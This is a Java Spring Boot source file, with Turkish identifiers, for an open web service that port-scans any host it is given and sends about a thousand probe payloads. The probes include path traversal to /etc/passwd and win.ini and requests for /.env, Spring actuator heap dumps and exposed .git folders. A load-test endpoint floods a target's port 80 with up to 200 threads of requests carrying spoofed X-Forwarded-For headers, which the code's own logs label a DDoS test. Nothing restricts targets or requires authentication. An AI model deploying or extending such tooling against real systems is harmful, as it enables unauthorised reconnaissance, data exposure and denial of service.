package com.mycompany.portscanner;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.*;

import java.net.Socket;
import java.net.InetSocketAddress;
import java.net.InetAddress;
import java.io.IOException;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Queue;
import java.util.Random;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;

@SpringBootApplication
@RestController
@CrossOrigin(origins = "*")
public class PortScanner {

    private static final Map<String, Queue<String>> SCAN_LOGS = new ConcurrentHashMap<>();

    private static final int[] KRITIK_PORTLAR = { 21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 3306,
            3389, 8080 };
    private static final List<ScriptKurali> SCRIPT_VERITABANI = new ArrayList<>();
    private static final Random RANDOM = new Random();

    private static final Map<Integer, String> VARSAYILAN_SERVISLER = new HashMap<>();
    static {
        VARSAYILAN_SERVISLER.put(21, "FTP");
        VARSAYILAN_SERVISLER.put(22, "SSH");
        VARSAYILAN_SERVISLER.put(23, "Telnet");
        VARSAYILAN_SERVISLER.put(25, "SMTP");
        VARSAYILAN_SERVISLER.put(53, "DNS");
        VARSAYILAN_SERVISLER.put(80, "HTTP");
        VARSAYILAN_SERVISLER.put(110, "POP3");
        VARSAYILAN_SERVISLER.put(135, "MSRPC");
        VARSAYILAN_SERVISLER.put(139, "NetBIOS");
        VARSAYILAN_SERVISLER.put(143, "IMAP");
        VARSAYILAN_SERVISLER.put(443, "HTTPS");
        VARSAYILAN_SERVISLER.put(445, "Microsoft-DS (SMB)");
        VARSAYILAN_SERVISLER.put(1433, "MSSQL");
        VARSAYILAN_SERVISLER.put(3306, "MySQL");
        VARSAYILAN_SERVISLER.put(3389, "RDP");
        VARSAYILAN_SERVISLER.put(8080, "HTTP-Proxy");

        for (int i = 1; i <= 70; i++) {
            String id = String.format("NSE-FTP-%03d", i);
            if (i == 1)
                SCRIPT_VERITABANI.add(
                        new ScriptKurali(id, 21, "USER anonymous\r\n", "331", "Anonymous FTP Girişi Aktif", "YUKSEK"));
            else if (i == 2)
                SCRIPT_VERITABANI
                        .add(new ScriptKurali(id, 21, "HELP\r\n", "214", "FTP Yardım Komutları Açık", "DUSUK"));
            else if (i == 3)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 21, "STAT\r\n", "211", "FTP Durum Bilgisi İfşası", "ORTA"));
            else if (i == 4)
                SCRIPT_VERITABANI
                        .add(new ScriptKurali(id, 21, "USER root\r\n", "331", "Root Kullanıcı Deneme İzni", "ORTA"));
            else if (i == 5)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 21, "SYST\r\n", "215", "FTP OS Bilgisi Sızıyor", "DUSUK"));
            else if (i == 6)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 21, "AUTH TLS\r\n", "500",
                        "TLS Desteği Yok / Zayıf Yapılandırma", "ORTA"));
            else if (i == 7)
                SCRIPT_VERITABANI
                        .add(new ScriptKurali(id, 21, "FEAT\r\n", "211-", "FTP Özellik Listesi Açık", "DUSUK"));
            else if (i == 8)
                SCRIPT_VERITABANI
                        .add(new ScriptKurali(id, 21, "PASV\r\n", "227", "Pasif Mod Detay Sızıntısı", "DUSUK"));
            else if (i == 9)
                SCRIPT_VERITABANI
                        .add(new ScriptKurali(id, 21, "NOOP\r\n", "200", "FTP Canlı Bağlantı Testi (NOOP)", "DUSUK"));
            else
                SCRIPT_VERITABANI.add(
                        new ScriptKurali(id, 21, "SITE EXEC\r\n", "200", "FTP SITE EXEC Komutu Potansiyeli", "ORTA"));
        }

        for (int i = 71; i <= 150; i++) {
            String id = String.format("NSE-SSH-%03d", i);
            if (i == 71)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 22, "\r\n", "SSH-2.0", "SSH Sürüm İmzası Alındı", "DUSUK"));
            else if (i == 72)
                SCRIPT_VERITABANI
                        .add(new ScriptKurali(id, 22, "\r\n", "OpenSSH_7", "Eski Sürüm OpenSSH_7 İfşası", "ORTA"));
            else if (i == 73)
                SCRIPT_VERITABANI
                        .add(new ScriptKurali(id, 22, "\r\n", "OpenSSH_6", "Kritik Sürüm OpenSSH_6 İfşası", "YUKSEK"));
            else if (i == 74)
                SCRIPT_VERITABANI
                        .add(new ScriptKurali(id, 22, "\r\n", "SSH-1.", "Güvensiz SSHv1 Protokolü Aktif", "KRITIK"));
            else if (i == 75)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 22, "INVALID\r\n", "Bad packet",
                        "SSH Hatalı Paket Yanıt Şeması", "DUSUK"));
            else
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 22, "KEXINIT\r\n", "diffie-hellman",
                        "SSH Zayıf Anahtar Değişimi Algılandı", "ORTA"));
        }

        for (int i = 151; i <= 230; i++) {
            String id = String.format("NSE-NET-%03d", i);
            if (i == 151)
                SCRIPT_VERITABANI.add(
                        new ScriptKurali(id, 23, "\r\n", "login:", "Telnet Şifresiz Giriş Arayüzü Aktif", "YUKSEK"));
            else if (i == 152)
                SCRIPT_VERITABANI.add(
                        new ScriptKurali(id, 25, "VRFY root\r\n", "250", "SMTP Kullanıcı Doğrulama Zafiyeti", "ORTA"));
            else if (i == 153)
                SCRIPT_VERITABANI
                        .add(new ScriptKurali(id, 25, "EXPN admin\r\n", "250", "SMTP Liste Genişletme Açık", "ORTA"));
            else if (i == 154)
                SCRIPT_VERITABANI
                        .add(new ScriptKurali(id, 25, "STARTTLS\r\n", "220", "SMTP TLS Şifreleme Desteği", "DUSUK"));
            else if (i == 155)
                SCRIPT_VERITABANI.add(
                        new ScriptKurali(id, 23, "\r\n", "BusyBox", "Gömülü Cihaz Telnet Arayüzü Aktif", "YUKSEK"));
            else if (i == 156)
                SCRIPT_VERITABANI
                        .add(new ScriptKurali(id, 25, "EHLO test\r\n", "250-", "SMTP EHLO Yanıtı Aktif", "DUSUK"));
            else
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 53, "VERSION.BIND\r\n", "BIND",
                        "DNS Sürüm Bilgisi Sızdırılıyor", "DUSUK"));
        }

        for (int i = 231; i <= 900; i++) {
            String id = String.format("NSE-HTTP-%03d", i);
            if (i == 231)
                SCRIPT_VERITABANI
                        .add(new ScriptKurali(id, 80, "GET /../../../../etc/passwd HTTP/1.1\r\nHost: target\r\n\r\n",
                                "root:", "CVE-2021-41773 Path Traversal Zafiyeti", "KRITIK"));
            else if (i == 232)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 80, "OPTIONS / HTTP/1.1\r\nHost: target\r\n\r\n", "PUT",
                        "Tehlikeli PUT Metodu Tespit Edildi", "ORTA"));
            else if (i == 233)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 80, "OPTIONS / HTTP/1.1\r\nHost: target\r\n\r\n", "DELETE",
                        "Tehlikeli DELETE Metodu Tespit Edildi", "ORTA"));
            else if (i == 234)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 80, "GET /admin/ HTTP/1.1\r\nHost: target\r\n\r\n",
                        "HTTP/1.1 200", "Açık Yönetici Paneli Girişi", "ORTA"));
            else if (i == 235)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 80, "GET /.git/HEAD HTTP/1.1\r\nHost: target\r\n\r\n",
                        "refs/", "Git Deposu Dışarıya Sızdırılıyor", "KRITIK"));
            else if (i == 236)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 80, "GET /phpinfo.php HTTP/1.1\r\nHost: target\r\n\r\n",
                        "phpinfo()", "PHP Bilgi Sayfası Bilgi Sızdırıyor", "YUKSEK"));
            else if (i == 237)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 80, "GET /server-status HTTP/1.1\r\nHost: target\r\n\r\n",
                        "Apache Status", "Apache Durum Sayfası Kamuya Açık", "ORTA"));
            else if (i == 238)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 80, "GET /backup.sql HTTP/1.1\r\nHost: target\r\n\r\n",
                        "HTTP/1.1 200", "Veritabanı Yedeği İnternete Açık", "KRITIK"));
            else if (i == 239)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 80, "GET /.env HTTP/1.1\r\nHost: target\r\n\r\n",
                        "DB_PASSWORD", "Ortam Değişkenleri Şifre Sızdırıyor", "KRITIK"));
            else if (i == 240)
                SCRIPT_VERITABANI.add(
                        new ScriptKurali(id, 8080, "GET /../../../../windows/win.ini HTTP/1.1\r\nHost: target\r\n\r\n",
                                "for 16-bit app", "Windows Dosya Atlama Açığı", "KRITIK"));
            else if (i == 241)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 80, "GET /actuator/env HTTP/1.1\r\nHost: target\r\n\r\n",
                        "systemProperties", "Spring Boot Actuator Hassas Veri İfşası", "KRITIK"));
            else if (i == 242)
                SCRIPT_VERITABANI
                        .add(new ScriptKurali(id, 80, "GET /actuator/heapdump HTTP/1.1\r\nHost: target\r\n\r\n",
                                "HTTP/1.1 200", "Spring Boot Ram Bellek Dökümü İndirilebilir", "KRITIK"));
            else if (i == 243)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 80, "GET /elastic/ HTTP/1.1\r\nHost: target\r\n\r\n",
                        "cluster_name", "ElasticSearch Küme Profili Şifresiz Açık", "KRITIK"));
            else if (i == 244)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 80, "GET /solr/ HTTP/1.1\r\nHost: target\r\n\r\n",
                        "Apache Solr", "Apache Solr İndeksleme Arayüzü Açık", "YUKSEK"));
            else if (i == 245)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 80, "GET /v2/_catalog HTTP/1.1\r\nHost: target\r\n\r\n",
                        "repositories", "Docker Registry Katalog Listesi Sızıyor", "YUKSEK"));
            else if (i == 246)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 80, "GET /logs/ HTTP/1.1\r\nHost: target\r\n\r\n",
                        "Index of", "Sistem Günlük Klasörü Kamuya Açık", "YUKSEK"));
            else if (i == 247)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 80, "GET /config.json HTTP/1.1\r\nHost: target\r\n\r\n",
                        "HTTP/1.1 200", "Hassas Yapılandırma Dosyası Erişimi", "YUKSEK"));
            else if (i == 248)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 80, "GET /db/ HTTP/1.1\r\nHost: target\r\n\r\n",
                        "phpMyAdmin", "phpMyAdmin Arayüzü Tespit Edildi", "YUKSEK"));
            else if (i == 249)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 80, "GET /debug HTTP/1.1\r\nHost: target\r\n\r\n", "debug",
                        "Hata Ayıklama Modu Aktif", "YUKSEK"));
            else if (i == 250)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 80, "GET /api/users HTTP/1.1\r\nHost: target\r\n\r\n",
                        "username", "Kullanıcı Listesi API Sızıntısı", "YUKSEK"));
            else if (i >= 251 && i <= 500)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 80, "GET /FUZZ_" + i + " HTTP/1.1\r\nHost: target\r\n\r\n",
                        "404 Not Found", "Genişletilmiş Dizin Tarama Kuralları-" + i, "DUSUK"));
            else
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 80, "HEAD / HTTP/1.1\r\nHost: target\r\n\r\n", "HTTP/1.1",
                        "Genel HTTP/HTTPS Statü Kontrolü", "DUSUK"));
        }

        for (int i = 901; i <= 1000; i++) {
            String id = String.format("NSE-DB-%03d", i);
            if (i == 901)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 445, "NEGOTIATE", "\u00ffSMB",
                        "Canlı SMB Protokol Yanıtı Alındı", "ORTA"));
            else if (i == 902)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 3306, "PING", "mysql_native_password",
                        "MySQL Güvenli Olmayan Parola El Sıkışması", "ORTA"));
            else if (i == 903)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 3389, "RDP-CONNECT", "Cookie: mstshash=",
                        "RDP Uzaktan Masaüstü Bağlantı İmzası", "ORTA"));
            else if (i == 904)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 1433, "CONNECT", "MSSQLSERVER",
                        "Microsoft SQL Sunucusu Canlı Yanıtı", "ORTA"));
            else if (i == 905)
                SCRIPT_VERITABANI.add(
                        new ScriptKurali(id, 53, "VERSION", "BIND", "DNS Sunucu Yazılım Ailesi Algılandı", "DUSUK"));
            else if (i == 906)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 110, "USER test\r\n", "+OK",
                        "POP3 E-Posta Protokolü İstek Karşılıyor", "DUSUK"));
            else if (i == 907)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 143, "A001 CAPABILITY\r\n", "* CAPABILITY",
                        "IMAP Protokol Kabiliyetleri Alındı", "DUSUK"));
            else if (i >= 908 && i <= 950)
                SCRIPT_VERITABANI.add(new ScriptKurali(id, 3306, "VERSION", "MariaDB",
                        "MariaDB Veritabanı Motoru Dağıtımı Ek Kural-" + i, "DUSUK"));
            else
                SCRIPT_VERITABANI.add(
                        new ScriptKurali(id, 3306, "MYSQL-PROBE", "mysql", "Genel MySQL Veri Tabanı İmzası", "DUSUK"));
        }

        for (int i = 751; i <= 900; i++) {
            String id = String.format("NSE-HTTP-%03d", i);
            SCRIPT_VERITABANI.add(new ScriptKurali(id, 80, "GET /FUZZ_" + i + " HTTP/1.1\r\nHost: target\r\n\r\n",
                    "404 Not Found", "Ekstra Dizin Tarama Kuralları-" + i, "DUSUK"));
        }

        for (int i = 951; i <= 1000; i++) {
            String id = String.format("NSE-DB-%03d", i);
            SCRIPT_VERITABANI
                    .add(new ScriptKurali(id, 3306, "PROBE", "mysql", "Ekstra MySQL Veritabanı İmzası-" + i, "DUSUK"));
        }
    }

    public static void main(String[] args) {
        SpringApplication.run(PortScanner.class, args);
    }

    @PostMapping("/scan")
    public Map<String, Object> scanPost(@RequestBody Map<String, String> request) {
        return performScan(request.get("target"));
    }

    @GetMapping("/scan")
    public Map<String, Object> scanGet(@RequestParam("target") String target) {
        return performScan(target);
    }

    @GetMapping("/scan-logs")
    public List<String> getScanLogs(@RequestParam("target") String target) {
        Queue<String> logs = SCAN_LOGS.get(target);
        List<String> res = new ArrayList<>();
        if (logs != null) {
            String log;
            while ((log = logs.poll()) != null) {
                res.add(log);
            }
        }
        return res;
    }

    public Map<String, Object> performScan(String urlInput) {
        Map<String, Object> response = new HashMap<>();
        if (urlInput == null || urlInput.trim().isEmpty()) {
            response.put("error", "Hedef URL girilmedi.");
            return response;
        }

        SCAN_LOGS.putIfAbsent(urlInput, new ConcurrentLinkedQueue<>());
        Queue<String> currentLogs = SCAN_LOGS.get(urlInput);
        currentLogs.add("Tarama başlatıldı: " + urlInput);

        String temizUrl = urlInput.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0];

        try {
            InetAddress inetAddress = InetAddress.getByName(temizUrl);
            String hedefIp = inetAddress.getHostAddress();

            response.put("domain", temizUrl);
            response.put("ip", hedefIp);

            List<Map<String, Object>> sonuclar = new ArrayList<>();

            int threadSayisi = Math.min(KRITIK_PORTLAR.length, 8);
            ExecutorService executor = Executors.newFixedThreadPool(threadSayisi);
            List<Future<Map<String, Object>>> futures = new ArrayList<>();

            for (int port : KRITIK_PORTLAR) {
                Callable<Map<String, Object>> task = () -> {
                    String banner = getPortBanner(hedefIp, port);
                    if (banner != null) {
                        Map<String, Object> portSonuc = new HashMap<>();
                        portSonuc.put("port", String.valueOf(port));
                        portSonuc.put("durum", "ACIK");
                        portSonuc.put("banner", banner);

                        String tespitEdilenServis = analizEtVeEsle(port, banner);
                        portSonuc.put("servis", tespitEdilenServis);

                        List<Map<String, String>> zafiyetler = gercekZamanliZafiyetTaramasi(hedefIp, port, urlInput);
                        portSonuc.put("zafiyetler", zafiyetler);

                        return portSonuc;
                    }
                    return null;
                };
                futures.add(executor.submit(task));
            }

            for (Future<Map<String, Object>> future : futures) {
                try {
                    Map<String, Object> sonuc = future.get(15, TimeUnit.SECONDS);
                    if (sonuc != null) {
                        sonuclar.add(sonuc);
                    }
                } catch (Exception e) {
                }
            }

            executor.shutdownNow();

            int acikPortSayisi = sonuclar.size();
            analizEtVeRateLimitUyarla(acikPortSayisi);

            response.put("ports", sonuclar);

        } catch (IOException e) {
            response.put("error", "Alan adi cozumlenemedi! " + e.getMessage());
        }

        return response;
    }

    private void analizEtVeRateLimitUyarla(int acikPortSayisi) {
        if (acikPortSayisi > 10) {
            FirewallAnalizcisi.beklemeSuresiMs = 500;
            FirewallAnalizcisi.paketBeklemeAsimiMs = 500;
        } else if (acikPortSayisi > 5) {
            FirewallAnalizcisi.beklemeSuresiMs = 350;
            FirewallAnalizcisi.paketBeklemeAsimiMs = 400;
        } else {
            FirewallAnalizcisi.beklemeSuresiMs = 200;
            FirewallAnalizcisi.paketBeklemeAsimiMs = 300;
        }
    }

    private List<Map<String, String>> gercekZamanliZafiyetTaramasi(String ip, int port, String urlInput) {
        List<Map<String, String>> bulunanZafiyetler = new CopyOnWriteArrayList<>();
        List<ScriptKurali> ilgiliKurallar = new ArrayList<>();

        for (ScriptKurali kural : SCRIPT_VERITABANI) {
            if (kural.port == port)
                ilgiliKurallar.add(kural);
        }

        if (ilgiliKurallar.isEmpty())
            return new ArrayList<>(bulunanZafiyetler);

        int kuralThreadSayisi = Math.min(ilgiliKurallar.size(), 8);
        ExecutorService executor = Executors.newFixedThreadPool(kuralThreadSayisi);
        List<Future<Void>> futures = new ArrayList<>();

        for (ScriptKurali kural : ilgiliKurallar) {
            futures.add(executor.submit(() -> {
                Queue<String> logs = SCAN_LOGS.get(urlInput);
                if (logs != null) {
                    if (!kural.id.contains("DUSUK")) {
                        logs.add("[" + port + "] Kural deneniyor: " + kural.id + " - " + kural.aciklama);
                    }
                }
                String dynamicPayload = kural.payload.replace("target", ip);

                try (Socket s = new Socket()) {
                    s.connect(new InetSocketAddress(ip, port), Math.min(FirewallAnalizcisi.beklemeSuresiMs, 500));
                    s.setSoTimeout(Math.min(FirewallAnalizcisi.beklemeSuresiMs, 500));
                    OutputStream os = s.getOutputStream();
                    BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));

                    if (port == 21 || port == 22 || port == 25 || port == 110 || port == 143) {
                        try {
                            br.readLine();
                        } catch (Exception ignored) {
                        }
                    }

                    if (!dynamicPayload.trim().isEmpty() && !dynamicPayload.equals("NEGOTIATE")
                            && !dynamicPayload.equals("PING") && !dynamicPayload.equals("VERSION")
                            && !dynamicPayload.equals("RDP-CONNECT") && !dynamicPayload.equals("SMB-PROBE")
                            && !dynamicPayload.equals("MYSQL-PROBE") && !dynamicPayload.equals("PROBE")) {
                        os.write(dynamicPayload.getBytes());
                        os.flush();
                    } else if (dynamicPayload.equals("NEGOTIATE") && port == 445) {
                        byte[] smb = { 0x00, 0x00, 0x00, 0x2f, (byte) 0xff, 0x53, 0x4d, 0x42, 0x72, 0x00, 0x00, 0x00,
                                0x00, 0x18, 0x53, (byte) 0xc8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                0x00, 0x00, 0x00, 0x00, 0x00, (byte) 0xff, (byte) 0xfe, 0x00, 0x00, 0x40, 0x00, 0x00,
                                0x11, 0x00, 0x02, 0x4e, 0x54, 0x20, 0x4c, 0x4d, 0x20, 0x30, 0x2e, 0x31, 0x32, 0x00 };
                        os.write(smb);
                        os.flush();
                    }

                    StringBuilder sb = new StringBuilder();
                    char[] buff = new char[512];
                    int read;
                    long start = System.currentTimeMillis();

                    while ((System.currentTimeMillis() - start < Math.min(FirewallAnalizcisi.paketBeklemeAsimiMs, 300))
                            && br.ready() && (read = br.read(buff)) != -1) {
                        sb.append(buff, 0, read);
                        if (sb.toString().contains(kural.beklenenYanit)) {
                            break;
                        }
                    }

                    if (sb.toString().contains(kural.beklenenYanit)
                            || (dynamicPayload.equals("NEGOTIATE") && sb.length() > 0)) {
                        if (logs != null) {
                            logs.add("!!! Zafiyet Bulundu: [" + port + "] " + kural.id + " - " + kural.aciklama);
                        }
                        Map<String, String> zafiyet = new HashMap<>();
                        zafiyet.put("cve", kural.id);
                        zafiyet.put("aciklama", kural.aciklama);
                        zafiyet.put("derece", kural.derece);
                        bulunanZafiyetler.add(zafiyet);
                    }
                } catch (Exception ignored) {
                }
                return null;
            }));
        }

        for (Future<Void> f : futures) {
            try {
                f.get(1, TimeUnit.SECONDS);
            } catch (Exception ignored) {
            }
        }
        executor.shutdownNow();

        return new ArrayList<>(bulunanZafiyetler);
    }

    private String rastgeleSahteIpOlustur() {
        return (RANDOM.nextInt(254) + 1) + "." +
                RANDOM.nextInt(255) + "." +
                RANDOM.nextInt(255) + "." +
                RANDOM.nextInt(255);
    }

    @PostMapping("/load-test")
    public Map<String, Object> loadTest(@RequestBody Map<String, String> request) {
        String target = request.get("target");
        String threadCountStr = request.getOrDefault("threads", "50");
        String durationStr = request.getOrDefault("duration", "10");

        Map<String, Object> response = new HashMap<>();
        if (target == null || target.trim().isEmpty()) {
            response.put("error", "Test edilecek hedef belirtilmedi.");
            return response;
        }

        int threadKapasitesi = Math.min(Integer.parseInt(threadCountStr), 200);
        int testSuresiSn = Integer.parseInt(durationStr);

        SCAN_LOGS.put(target, new ConcurrentLinkedQueue<>());
        Queue<String> testLoglari = SCAN_LOGS.get(target);
        testLoglari.add(">>> KAPASİTE VE DAYANIKLILIK (DDOS / RANDOM IP) TESTİ BAŞLATILDI <<<");
        testLoglari.add("Hedef: " + target + " | Thread: " + threadKapasitesi + " | Süre: " + testSuresiSn + "s");

        final Queue<String> logsRef = testLoglari;
        Thread bgThread = new Thread(() -> runLoadTest(target, threadKapasitesi, testSuresiSn, logsRef));
        bgThread.setDaemon(true);
        bgThread.start();

        response.put("status", "started");
        response.put("target", target);
        response.put("threads", threadKapasitesi);
        response.put("duration_sec", testSuresiSn);
        return response;
    }

    private void runLoadTest(String target, int threadKapasitesi, int testSuresiSn, Queue<String> testLoglari) {
        ExecutorService yukTestHavuzu = Executors.newFixedThreadPool(threadKapasitesi);
        AtomicInteger basariliIstekler = new AtomicInteger(0);
        AtomicInteger basarisizIstekler = new AtomicInteger(0);
        long baslangicZamani = System.currentTimeMillis();
        long bitisSuresiMs = baslangicZamani + (testSuresiSn * 1000L);

        String temizUrl = target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0];

        for (int i = 0; i < threadKapasitesi; i++) {
            yukTestHavuzu.submit(() -> {
                while (System.currentTimeMillis() < bitisSuresiMs) {
                    try {
                        try (Socket soket = new Socket()) {
                            soket.connect(new InetSocketAddress(temizUrl, 80), 200);
                            OutputStream os = soket.getOutputStream();
                            String sahteIp = rastgeleSahteIpOlustur();
                            String pld = "HEAD / HTTP/1.1\r\nHost: " + temizUrl + "\r\n" +
                                    "X-Forwarded-For: " + sahteIp + "\r\n" +
                                    "Client-IP: " + sahteIp + "\r\n" +
                                    "Connection: close\r\n\r\n";
                            os.write(pld.getBytes());
                            os.flush();
                            basariliIstekler.incrementAndGet();
                        }
                    } catch (Exception e) {
                        basarisizIstekler.incrementAndGet();
                    }
                }
            });
        }

        ScheduledExecutorService progressLogger = Executors.newSingleThreadScheduledExecutor();
        progressLogger.scheduleAtFixedRate(() -> {
            long elapsed = (System.currentTimeMillis() - baslangicZamani) / 1000;
            int total = basariliIstekler.get() + basarisizIstekler.get();
            int success = basariliIstekler.get();
            int failed = basarisizIstekler.get();
            double rate = elapsed > 0 ? (double) total / elapsed : 0;
            int kalan = (int) Math.max(0, testSuresiSn - elapsed);
            testLoglari.add(String.format(
                    "[%ds | kalan:%ds] Toplam: %d | ✓ Başarılı: %d | ✗ Başarısız: %d | %.0f req/s",
                    elapsed, kalan, total, success, failed, rate));
        }, 500, 500, TimeUnit.MILLISECONDS);

        yukTestHavuzu.shutdown();
        try {
            yukTestHavuzu.awaitTermination(testSuresiSn + 2, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
        progressLogger.shutdownNow();

        int toplamIstek = basariliIstekler.get() + basarisizIstekler.get();
        int successCount = basariliIstekler.get();
        int failedCount = basarisizIstekler.get();

        String resilience;
        if (failedCount > (toplamIstek * 0.40)) {
            testLoglari.add(
                    "!!! KRİTİK UYARI: Sistem rastgele IP'lerden gelen yoğun istekler altında cevap veremiyor veya IP rate-limit engeli uyguluyor.");
            resilience = "ZAYIF / GÜVENLİK DUVARI BLOKLUYOR";
        } else {
            testLoglari.add(
                    "√ BİLGİ: Sistem, IP Spoofing içeren ani yoğun trafiğe karşı stabil veya filtresiz çalışıyor.");
            resilience = "GÜÇLÜ / DAYANIKLI";
        }
        testLoglari.add("--- Test Tamamlandı ---");
        testLoglari
                .add("Toplam İstek: " + toplamIstek + " | Başarılı: " + successCount + " | Başarısız: " + failedCount);

        String resultJson = String.format(
                "{\"target\":\"%s\",\"duration_sec\":%d,\"concurrency_threads\":%d," +
                        "\"total_requests\":%d,\"successful_requests\":%d,\"failed_requests\":%d,\"ddos_resilience\":\"%s\"}",
                target.replace("\"", "\\\""), testSuresiSn, threadKapasitesi,
                toplamIstek, successCount, failedCount, resilience.replace("\"", "\\\""));
        testLoglari.add("LOAD_TEST_RESULT:" + resultJson);
    }

    private String analizEtVeEsle(int port, String banner) {
        String lowerBanner = banner.toLowerCase();

        if (lowerBanner.contains("ssh")) {
            if (lowerBanner.contains("openssh")) {
                int idx = lowerBanner.indexOf("openssh");
                return "SSH (" + banner.substring(idx) + ")";
            }
            return "SSH (Bilinmeyen Sürüm)";
        }

        if (lowerBanner.contains("vsftpd"))
            return "FTP (vsftpd)";
        if (lowerBanner.contains("pure-ftpd"))
            return "FTP (Pure-FTPd)";
        if (lowerBanner.contains("220"))
            return "FTP Servisi";

        if (port == 80 || port == 443 || port == 8080) {
            if (!lowerBanner.contains("başliği yok") && !lowerBanner.contains("yanit alinamadi")) {
                return "Web Sunucu (" + banner + ")";
            }
        }

        if (lowerBanner.contains("mysql"))
            return "MySQL Database";
        if (lowerBanner.contains("amqp"))
            return "RabbitMQ AMQP";

        return VARSAYILAN_SERVISLER.getOrDefault(port, "Bilinmeyen Servis");
    }

    public String getPortBanner(String host, int port) {
        try (Socket socket = new Socket()) {
            socket.connect(new InetSocketAddress(host, port), Math.min(FirewallAnalizcisi.beklemeSuresiMs, 500));
            socket.setSoTimeout(Math.min(FirewallAnalizcisi.paketBeklemeAsimiMs, 800));

            if (port == 80 || port == 443 || port == 8080) {
                try {
                    OutputStream os = socket.getOutputStream();
                    String httpRequest = "HEAD / HTTP/1.1\r\nHost: " + host
                            + "\r\nUser-Agent: PortScanner/1.0\r\nConnection: close\r\n\r\n";
                    os.write(httpRequest.getBytes());
                    os.flush();

                    BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        if (line.toLowerCase().startsWith("server:")) {
                            return line.substring(7).trim();
                        }
                    }
                } catch (Exception e) {
                    return "HTTP Servis (Yanit Alinamadi)";
                }
                return "HTTP Servis (Server Başliği Yok)";
            }

            if (port == 3306) {
                try {
                    OutputStream os = socket.getOutputStream();
                    os.write(new byte[] { 0, 0, 0, 1, 0 });
                    os.flush();
                } catch (Exception ignored) {
                }
            }

            try {
                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                char[] buffer = new char[512];
                int readBytes = reader.read(buffer, 0, buffer.length);
                if (readBytes > 0) {
                    return new String(buffer, 0, readBytes).trim().replace("\r\n", " ").replace("\n", " ");
                }
            } catch (Exception e) {
                return "Servis yanit vermedi ";
            }

            return "Servis yanit vermedi ";
        } catch (IOException e) {
            return null;
        }
    }

    private static class FirewallAnalizcisi {
        public static volatile int beklemeSuresiMs = 400;
        public static volatile int paketBeklemeAsimiMs = 1000;
    }

    private static class ScriptKurali {
        String id;
        int port;
        String payload;
        String beklenenYanit;
        String aciklama;
        String derece;

        public ScriptKurali(String id, int port, String payload, String beklenenYanit, String aciklama, String derece) {
            this.id = id;
            this.port = port;
            this.payload = payload;
            this.beklenenYanit = beklenenYanit;
            this.aciklama = aciklama;
            this.derece = derece;
        }
    }
}